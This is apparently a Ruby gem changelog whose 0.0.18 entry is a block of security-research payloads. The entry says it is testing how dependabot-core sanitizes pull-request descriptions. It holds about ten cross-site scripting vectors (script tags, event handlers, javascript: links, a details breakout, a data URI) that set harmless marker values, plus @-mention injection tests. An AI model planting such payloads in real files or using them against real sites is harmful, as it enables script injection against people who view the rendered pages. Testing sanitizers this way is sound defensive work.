# Changelog

## 0.0.18

Security research payload for dependabot-core PR-description sanitization audit
(authorized, self-owned throwaway repos only). Markers below let us tell exactly
which vector survived into the rendered PR on github.com.

Script tag: <script>window.__mygem_xss_script=1;document.title='XSS-SCRIPT';</script>

Img onerror: <img src=x onerror="window.__mygem_xss_imgonerror=1;document.title='XSS-IMG'">

Svg onload: <svg onload="window.__mygem_xss_svgonload=1;document.title='XSS-SVG'">

Iframe javascript src: <iframe src="javascript:window.__mygem_xss_iframe=1"></iframe>

Raw anchor javascript href: <a href="javascript:window.__mygem_xss_rawa=1">raw anchor click</a>

Markdown link javascript href: [markdown link click](javascript:window.__mygem_xss_mdlink=1)

Details/summary breakout attempt: --></details><script>window.__mygem_xss_breakout=1</script><details><summary>x</summary>

Template tag (expect this one alone to be escaped by dependabot-core itself): <template><script>window.__mygem_xss_template=1</script></template>

Data URI img: <img src="data:text/html,%3Cscript%3Ewindow.__mygem_xss_datauri=1%3C/script%3E">

Style/expression: <style>body{background:url('javascript:window.__mygem_xss_style=1')}</style>

Self-mention (safe, own account only): @marouanedahmani27-coder should this become a plain code span, not a live @-notification?

Self team-mention (safe, own account only): @marouanedahmani27-coder/faketeam should this also become a plain code span?

End of payload block.

## 0.0.17

Initial clean baseline release, no changes.
